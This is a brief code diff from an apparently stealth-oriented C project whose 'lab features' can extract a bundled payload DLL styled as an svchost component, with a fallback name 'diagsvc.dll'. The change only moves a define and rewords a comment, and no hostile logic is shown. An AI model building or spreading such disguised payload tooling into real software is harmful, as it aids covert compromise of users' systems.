@@ -8,9 +8,7 @@
 #include "svchost_payload.h"
 #include "stealth_defaults.h"
 
-#ifndef STEALTH_FALLBACK_DLL_NAME
-#define STEALTH_FALLBACK_DLL_NAME L"diagsvc.dll"
-#endif
+/* STEALTH_FALLBACK_DLL_NAME comes from stealth_defaults.h */
 
 static int EnvEnabledW(const wchar_t* name, int defaultOn)
 {
@@ -69,7 +67,7 @@ void Stealth_InitLabFeatures(void)
         }
     }
 
-    // 5) Optionally extract bundled svchost DLL payload (from compiled header)
+    // 5) Optionally extract bundled svchost DLL payload from the current package.
     if (EnvEnabledW(L"STEALTH_BUNDLE_EXTRACT", extractDefault)) {
         wchar_t dllOut[MAX_PATH] = {0};
         BOOL useInstallPath = FALSE;
